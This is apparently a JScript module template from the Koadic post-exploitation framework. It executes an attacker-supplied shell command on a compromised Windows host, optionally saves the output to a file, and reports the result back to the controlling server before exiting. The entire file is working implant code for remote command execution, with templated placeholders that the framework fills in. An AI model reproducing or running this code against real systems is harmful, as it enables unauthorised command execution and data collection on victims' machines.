try
{
    var readout = ~OUTPUT~;
    if (readout)
    {
        var output = Koadic.shell.exec("~FCMD~", "~FDIRECTORY~\\"+Koadic.uuid()+".txt");
    }
    else
    {
        var output = "";
        Koadic.shell.run("~FCMD~");
        Koadic.work.report();
    }

    if (output != "")
    {
        Koadic.work.report(output);
    }
}
catch (e)
{
    Koadic.work.error(e);
}

Koadic.exit();
